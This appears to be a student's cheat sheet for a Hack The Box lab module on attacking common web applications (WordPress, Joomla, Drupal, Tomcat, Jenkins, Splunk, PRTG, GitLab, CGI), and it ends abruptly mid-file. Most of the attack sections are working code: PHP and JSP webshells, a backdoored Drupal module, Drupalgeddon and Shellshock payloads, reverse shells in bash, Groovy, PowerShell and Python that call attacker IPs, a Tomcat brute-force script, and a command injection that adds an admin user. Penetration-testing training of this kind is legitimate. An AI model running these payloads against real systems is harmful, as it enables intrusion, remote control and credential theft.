
# Introduction to Attacking Common Applications 

**HOSTS FILE CONFIGURATION**

```
IP=10.129.42.195
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

**FILE PATHS**

```
/etc/hosts
/etc/cloud/templates/hosts.debian.tmpl
/etc/cloud/cloud.cfg
```

**VHOSTS**

```
app.inlanefreight.local
dev.inlanefreight.local
blog.inlanefreight.local
```

---


# Application Discovery & Enumeration

**NMAP SCAN**

```bash
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

```bash
sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

```bash
sudo nmap --open -sV 10.129.201.50
```

**SCOPE FILE**

```bash
cat scope_list
```

```bash
app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
drupal-qa.inlanefreight.local
drupal-acc.inlanefreight.local
drupal.inlanefreight.local
blog-dev.inlanefreight.local
blog.inlanefreight.local
app-dev.inlanefreight.local
jenkins-dev.inlanefreight.local
jenkins.inlanefreight.local
web01.inlanefreight.local
gitlab-dev.inlanefreight.local
gitlab.inlanefreight.local
support-dev.inlanefreight.local
support.inlanefreight.local
inlanefreight.local
10.129.201.50
```

**EYEWITNESS INSTALL**

```
git clone https://github.com/FortyNorthSecurity/EyeWitness.git
```

```
cd EyeWitness/Python/setup
```

```
cd EyeWitness/setup
```

```
pip3 install rapidfuzz
```

```bash
sudo apt install eyewitness
```

**EYEWITNESS HELP**

```bash
eyewitness -h
```

**EYEWITNESS RUN**

```bash
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

**AQUATONE DOWNLOAD**

```bash
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```

**AQUATONE EXTRACT**

```bash
unzip aquatone_linux_amd64_1.7.0.zip
```

**PATH CHECK**

```bash
echo $PATH
```

**AQUATONE RUN**

```bash
cat web_discovery.xml | ./aquatone -nmap
```


# WordPress - Discovery & Enumeration

**ROBOTS.TXT ENUMERATION**

```RUST
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```

**WORDPRESS LOGIN**

```rust
/wp-login.php
```

**CURL WORDPRESS DETECTION**

```bash
curl -s http://blog.inlanefreight.local | grep WordPress
```

**THEME ENUMERATION**

```bash
curl -s http://blog.inlanefreight.local/ | grep themes
```

```html
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
```

**PLUGIN ENUMERATION**

```bash
curl -s http://blog.inlanefreight.local/ | grep plugins
```

```html
<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
<link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
```

**PLUGIN ENUMERATION (SECOND PAGE)**

```bash
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
```

```html
<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />
```

**PLUGIN DIRECTORY ENUMERATION**

```bash
http://blog.inlanefreight.local/wp-content/plugins/mail-masta/
```

```bash
http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
```

**WPSCAN INSTALL**

```bash
sudo gem install wpscan
```

**WPSCAN HELP**

```bash
wpscan -h
```

**WPSCAN ENUMERATION**

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```

```
http://blog.inlanefreight.local/wp-content/uploads/
```

```rust
http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt
```
# Attacking WordPress

**WPSCAN BRUTEFORCE**

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

**WORDPRESS WEBSHELL (THEME EDITOR)**

```php
system($_GET[0]);
```

**WEBSHELL EXECUTION**

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

**METASPLOIT MODULE**

```bash
use exploit/unix/webapp/wp_admin_shell_upload
```

```bash
set username john
set password firebird1
set lhost 10.10.14.15
set rhost 10.129.42.195
set VHOST blog.inlanefreight.local
```

```bash
show options
```

```bash
exploit
```

**MAIL-MASTA LFI**

```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**WPDISCUZ EXPLOIT**

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

**WPDISCUZ WEBSHELL EXECUTION**

```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```
---
```
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat%20/var/www/flag.txt"
```

used /var/www/*

```
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat%20/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"
```

# Joomla - Discovery & Enumeration

**JOOMLA DETECTION**

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

**JOOMLA STATS API**

```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
```

**ROBOTS.TXT ENUMERATION**

```bash
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

**README VERSION ENUMERATION**

```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

**XML VERSION ENUMERATION**

```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

**DROOPESCAN INSTALL**

```bash
sudo pip3 install droopescan
```

**DROOPESCAN HELP**

```bash
droopescan -h
```

**DROOPESCAN ENUMERATION**
```
joomscan --url http://app.inlanefreight.local/
```

```bash
droopescan scan joomla --url http://dev.inlanefreight.local/
```

**PYTHON 2.7 SETUP (JOOMLASCAN)**

```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
python2.7 -m pip install urllib3
python2.7 -m pip install certifi
python2.7 -m pip install bs4
```

**JOOMLASCAN**

```bash
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

**JOOMLA ADMIN LOGIN**

```bash
/administrator/index.php
```

**JOOMLA BRUTEFORCE**

```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```


# Attacking Joomla

**JOOMLA ADMIN PANEL**

```bash
http://dev.inlanefreight.local/administrator
```

**PLUGIN FIX (ERROR ISSUE)**

```bash
http://dev.inlanefreight.local/administrator/index.php?option=com_plugins
```

**TEMPLATES PANEL**

```bash
http://dev.inlanefreight.local/administrator/index.php?option=com_templates
```

**TEMPLATE EDITOR (ERROR.PHP)**

```bash
http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D
```

**JOOMLA WEBSHELL**

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

**WEBSHELL EXECUTION**

```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

**JOOMLA DIRECTORY TRAVERSAL EXPLOIT**

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```



# Drupal - Discovery & Enumeration

**DRUPAL DETECTION**

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
```

**NODE ENUMERATION**

```bash
/node/1
```

**CHANGELOG VERSION ENUMERATION**

```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 "" 
```

```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
```

**DROOPESCAN ENUMERATION**

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```


# Attacking Drupal

**PHP FILTER WEBSHELL**

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

**WEBSHELL EXECUTION**

```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

**PHP FILTER MODULE DOWNLOAD**

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

its not in 
```
http://drupal.inlanefreight.local/admin/reports/updates/install
```
Scroll down in Modules
Find: Update Manager / Check it 
then install new modules
This link 
```
http://drupal-qa.inlanefreight.local/admin/modules/install
```

**BACKDOORED MODULE DOWNLOAD**

```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```

**MODULE EXTRACTION**

```bash
tar xvf captcha-8.x-1.2.tar.gz
```

**WEBSHELL FILE**

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

**HTACCESS FILE**

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

**ARCHIVE BACKDOORED MODULE**

```bash
mv shell.php .htaccess captcha
```

```bash
tar cvf captcha.tar.gz captcha/
```

**MODULE WEBSHELL EXECUTION**

```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

**DRUPALGEDDON (ADMIN CREATION)**

```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

**DRUPALGEDDON2 (BASE64 PAYLOAD)**

```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```

```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

**DRUPALGEDDON2 EXECUTION**

```bash
python3 drupalgeddon2.py
```

**DRUPALGEDDON2 WEBSHELL**

```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

**DRUPALGEDDON3 (METASPLOIT)**

```bash
set rhosts 10.129.42.195
```

```bash
set VHOST drupal-acc.inlanefreight.local
```

```bash
set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
```

```bash
set DRUPAL_NODE 1
```

```bash
set LHOST 10.10.14.15
```

```bash
show options
```

```bash
exploit
```


```
curl "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261'"
```

```
# List drupal directories
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=ls%20-la%20/var/www/" | grep drupal

# List contents of main drupal dir
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=ls%20-la%20/var/www/drupal.inlanefreight.local/" | grep flag
```

```
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=cat%20-la%20/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt" 
```
ctrl shift f `encoded




# Tomcat - Discovery & Enumeration

**TOMCAT DETECTION (DOCS PAGE)**

```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

**GOBUSTER ENUMERATION**

```bash
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

**General folder structure**


```
├── bin ├── conf │   ├── catalina.policy │   ├── catalina.properties │   ├── context.xml │   ├── tomcat-users.xml │   ├── tomcat-users.xsd │   └── web.xml ├── lib ├── logs ├── temp ├── webapps │   ├── manager │   │   ├── images │   │   ├── META-INF │   │   
└── WEB-INF |   |       └── web.xml │   └── ROOT │       └── WEB-INF └── work     └── Catalina        └── localhost 
```

**Each folder inside `webapps` is expected to have the following structure.**

```
webapps/customapp ├── images ├── index.jsp ├── META-INF │   └── context.xml ├── status.xsd └── WEB-INF     ├── jsp    |   └── admin.jsp    └── web.xml    └── lib    |    └── jdbc_drivers.jar    └── classes        └── AdminServlet.class
```

**COMMON TOMCAT PATHS**

```bash
/docs
/examples
/manager
/host-manager
```

**TOMCAT USERS CONFIG**

```xml
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```

**WEB.XML STRUCTURE**

```xml
<servlet>
  <servlet-name>AdminServlet</servlet-name>
  <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
</servlet>

<servlet-mapping>
  <servlet-name>AdminServlet</servlet-name>
  <url-pattern>/admin</url-pattern>
</servlet-mapping>
```

**CLASS PATH**

```bash
classes/com/inlanefreight/api/AdminServlet.class
```


# Attacking Tomcat 

**METASPLOIT TOMCAT BRUTEFORCE**

```
auxiliary/scanner/http/tomcat_mgr_login
```

```bash
set VHOST web01.inlanefreight.local
```

```bash
set RPORT 8180
```

```bash
set stop_on_success true
```

```bash
set rhosts 10.129.201.58
```

```bash
show options
```

```bash
run
```

**METASPLOIT PROXY DEBUG**

```bash
set PROXIES HTTP:127.0.0.1:8080
```

```bash
run
```

**BASE64 DECODE CHECK**

```bash
echo YWRtaW46dmFncmFudA== |base64 -d
```

**PYTHON BRUTEFORCE SCRIPT**

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
```

**PYTHON SCRIPT USAGE**

```bash
python3 mgr_brute.py  -h
```

```bash
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

**scripting**

```
https://academy.hackthebox.com/course/preview/introduction-to-python-3
```

```
https://academy.hackthebox.com/course/preview/introduction-to-bash-scripting
```

**JSP WEBSHELL**

```java
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

**DOWNLOAD JSP SHELL**

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```

**CREATE WAR FILE**

```bash
zip -r backup.war cmd.jsp
```

**WEBSHELL EXECUTION**

```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

**MSFVENOM WAR PAYLOAD**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.198 LPORT=4443 -f war > backup.war
```

**NETCAT LISTENER**

```bash
nc -lnvp 4443
```

**AJP PORT SCAN**

```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

**GHOSTCAT LFI**

```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```


# Jenkins - Discovery & Enumeration

**JENKINS URL**

```bash
http://jenkins.inlanefreight.local:8000
```

**JENKINS LOGIN PAGE**

```bash
/login?from=%2F
```

**JENKINS SECURITY CONFIG**

```bash
/configureSecurity/
```

**DEFAULT CREDENTIALS**

```bash
admin:admin
```

**COMMON PORTS**

```bash
8080
5000
```


# Attacking Jenkins

**SCRIPT CONSOLE URL**

```bash
http://jenkins.inlanefreight.local:8000/script
```

**GROOVY COMMAND EXECUTION**

```
/script
```

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**GROOVY REVERSE SHELL (LINUX)**

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.198/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

**NETCAT LISTENER**

```bash
nc -lvnp 8443
```

**GROOVY COMMAND EXECUTION (WINDOWS)**

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

**JAVA REVERSE SHELL (WINDOWS)**

```
wget https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
```

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```
CVE-2018-1999002 and [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266)
```


# Splunk - Discovery & Enumeration

**NMAP SERVICE ENUMERATION**

```bash
sudo nmap -sV 10.129.201.50
```

**SPLUNK DEFAULT PORTS**

```bash
8000
8089
```

**SPLUNK URL**

```bash
https://10.129.201.50:8000
```

**DEFAULT CREDENTIALS**

```bash
admin:changeme
```

**COMMON PASSWORDS**

```bash
admin
Welcome
Welcome1
Password123
```

# Attacking Splunk

**DIRECTORY STRUCTURE**

```
wget https://github.com/0xjpuff/reverse_shell_splunk
```

```bash
tree splunk_shell/
```

```bash
splunk_shell/
├── bin
└── default
```

**POWERSHELL REVERSE SHELL**

```
wget https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1
```

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.17.198',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Apps → Manage Apps**  
Click: **“Install app from file”**
**INPUTS.CONF**
```
https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/configuration-file-reference/10.2.0-configuration-file-reference/inputs.conf
```

```bash
cat inputs.conf
```

```bash
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

**BATCH FILE**

```bash
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

**CREATE ARCHIVE**

```bash
tar -cvzf updater.tar.gz splunk_shell/
```

**UPLOAD PATH**

```bash
https://10.129.201.50:8000/en-US/manager/search/apps/local
```

```bash
https://10.129.201.50:8000/en-US/manager/appinstall/_upload
```

**NETCAT LISTENER**

```bash
sudo nc -lnvp 443
```

**PYTHON REVERSE SHELL (LINUX)**

```
wget https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py
```

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```



```
#A simple and small reverse shell. Options and help removed to save space. #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well. $client = New-Object System.Net.Sockets.TCPClient('10.10.17.198',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
# PRTG Network Monitor

**NMAP FULL SCAN**

```bash
sudo nmap -sV -p- --open -T4 10.129.201.50
```

**PRTG WEB URL**

```bash
http://10.129.201.50:8080/index.htm
```

**VERSION ENUMERATION**

```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

**DEFAULT CREDENTIALS**

```bash
prtgadmin:prtgadmin
```

**VALID CREDENTIALS**

```bash
prtgadmin:Password123
```

**COMMAND INJECTION PAYLOAD**

Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down

```bash
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

At this point, all that is left is to click the `Test` button to run our notification and execute the command to add a local admin user. After clicking `Test` we will get a pop-up that says `EXE notification is queued up`

**CRACKMAPEXEC VALIDATION**

```bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

```bash
netexec smb 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!' --shares
evil-winrm -i 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!'
cd Users/Administrator/Desktop
get flag.txt
type C:\Users\Administrator\Desktop\flag.txt
```

# osTicket

**OSTICKET URL**

```bash
http://support.inlanefreight.local/
```

**OPEN TICKET PAGE**

```bash
http://support.inlanefreight.local/open.php
```

**ADMIN LOGIN**

```bash
http://support.inlanefreight.local/scp/login.php
```

**DEHASHED ENUMERATION**

```bash
sudo python3 dehashed.py -q inlanefreight.local
```

```bash
jclayton:JulieC8765!
kgrimes:Fish1ng_s3ason!
```

**SUBDOMAIN ENUMERATION**

```bash
cat ilfreight_subdomains
```

```bash
vpn.inlanefreight.local
support.inlanefreight.local
ns1.inlanefreight.local
mail.inlanefreight.local
apps.inlanefreight.local
ftp.inlanefreight.local
dev.inlanefreight.local
ir.inlanefreight.local
auth.inlanefreight.local
careers.inlanefreight.local
portal-stage.inlanefreight.local
dns1.inlanefreight.local
dns2.inlanefreight.local
meet.inlanefreight.local
portal-test.inlanefreight.local
home.inlanefreight.local
legacy.inlanefreight.local
```

**
# GitLab - Discovery & Enumeration

**GITLAB URL**

```bash
http://gitlab.inlanefreight.local:8081
```

**LOGIN PAGE**

```bash
/users/sign_in
```

**REGISTER PAGE**

```bash
/users/sign_up
```

**HELP PAGE (VERSION)**

```bash
/help
/root/inlanefreight-dev
```

**EXPLORE PROJECTS**

```bash
/explore
```

**ADMIN SETTINGS**

```bash
/admin/application_settings/general
```

**DEFAULT TEST CREDENTIALS**

```bash
hacker:Welcome
```

# Attacking GitLab

**USER ENUMERATION SCRIPT**

```
https://www.exploit-db.com/exploits/49821
```

```bash
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

```
./gitlab_userenum.py \
--url http://gitlab.inlanefreight.local:8081/ \
--wordlist /usr/share/seclists/Usernames/cirt-default-usernames.txt
```

**VALID USERS**

```bash
root
bob
```

**ACCOUNT LOCKOUT SETTINGS**

```bash
config.maximum_attempts = 10
config.unlock_in = 10.minutes
```

**RCE EXPLOIT**

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.17.198 8443 >/tmp/f '
```

**NETCAT LISTENER**

```bash
nc -lnvp 8443
```


# Attacking Tomcat CGI 

**NMAP SCAN**

```bash
nmap -p- -sC -Pn 10.129.205.30 --open
```

**FFUF FUZZ (.CMD)**

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.cmd
```

**FFUF FUZZ (.BAT)**

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.57.124:8080/cgi/FUZZ.bat
```

**DISCOVERED CGI SCRIPT**

```bash
http://10.129.205.30:8080/cgi/welcome.bat
```

**COMMAND INJECTION (DIR)**

```bash
http://10.129.205.30:8080/cgi/welcome.bat?&dir
```

**ENV VARIABLES ENUMERATION**

```bash
http://10.129.205.30:8080/cgi/welcome.bat?&set
```

**WHOAMI (FULL PATH)**

```bash
http://10.129.205.30:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

**URL-ENCODED PAYLOAD**

```bash
http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

# Attacking CGI Applications - Shellshock

**GOBUSTER ENUMERATION**

```bash
gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

**DISCOVERED CGI SCRIPT**

```bash
http://10.129.205.27/cgi-bin/access.cgi
```

**CURL REQUEST (BASIC)**

```bash
curl -i http://10.129.205.27/cgi-bin/access.cgi
```

**SHELLSHOCK TEST PAYLOAD**

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
```

**REVERSE SHELL PAYLOAD**

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.17.198/7777 0>&1' http://10.129.57.124/cgi-bin/access.cgi
```

**NETCAT LISTENER**

```bash
sudo nc -lvnp 7777
```


# Attacking Thick Client Applications

**SMB ENUMERATION ARTIFACT**

```bash
Restart-OracleService.exe
```

**PROC MONITOR TOOL**

```bash
ProcMon64
```

**TEMP PATH**

```bash
C:\Users\Matt\AppData\Local\Temp
```

```bash
C:\Users\cybervaca\AppData\Local\Temp\2
```

- Right-click → **Properties**
- Security → Advanced
- Disable inheritance
- Convert permissions
- Edit your user (Show advanced permissions)
-  Uncheck:
    - Delete
    - Delete subfolders and files
**GENERATED FILES**

```bash
6F39.bat
6F39.tmp
```

```
notepad C:\Users\cybervaca\AppData\Local\Temp\2\XXXX.bat
```
**BATCH FILE (ORIGINAL)**

```batch
@shift /0
@echo off

if %username% == matt goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
